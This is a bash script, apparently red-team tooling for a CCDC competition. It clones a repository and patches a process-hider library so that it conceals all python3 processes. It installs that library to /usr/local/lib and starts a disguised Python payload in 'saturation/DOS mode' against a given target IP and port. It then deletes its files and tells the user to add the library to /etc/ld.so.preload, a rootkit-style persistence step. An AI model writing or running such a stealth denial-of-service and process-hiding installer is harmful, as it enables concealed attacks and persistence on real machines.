#!/bin/bash

cd /usr/share/

# Check if script is run with sudo
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root (use sudo)."
    exit 1
fi

# Check if script has proper args
if [ "$#" -eq 0 ]; then
    echo "Program running in install-only mode."
elif [ "$#" -eq 2 ]; then
    echo "Program running in saturation/DOS mode."
else
    echo "Proper usage is either `sudo ./$0` for install-only mode or `sudo ./$0 TARGET-IP TARGET-PORT` for saturation/DOS mode."
fi

# Define variables
REPO_URL="https://github.com/AYanofsky/ccdc-invisible-saturation/"
TARGET_FILE="processhider.c"
SEARCH_STRING="static const char* process_to_filter = "evil_script.py";"
REPLACE_STRING="static const char* process_to_filter = "python3";"

# Clone the repository
echo "Cloning repository..."
git clone "$REPO_URL"

if [ $? -ne 0 ]; then
    echo "Failed to clone repository. Exiting."
    exit 1
fi

# Change to the repository directory
cd ccdc-invisible-saturation

# Perform find and replace
echo "Performing find and replace..."
if [ -f "$TARGET_FILE" ]; then
    sed -i "s/$SEARCH_STRING/$REPLACE_STRING/g" "$TARGET_FILE"
    echo "Replacement complete."
else
    echo "Target file not found: $TARGET_FILE"
    exit 1
fi

make

mv libprocesshider.so /usr/local/lib/

echo $PWD

cd ..

mv ccdc-invisible-saturation/dev-inventory.yml ./dev-inventory.yml

exec -a malware python3 dev-inventory.yml $1 $2 &

rm -r ccdc-invisible-saturation

echo "Script execution completed successfully."
echo "To finish installation, use "
echo "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
echo "As root"
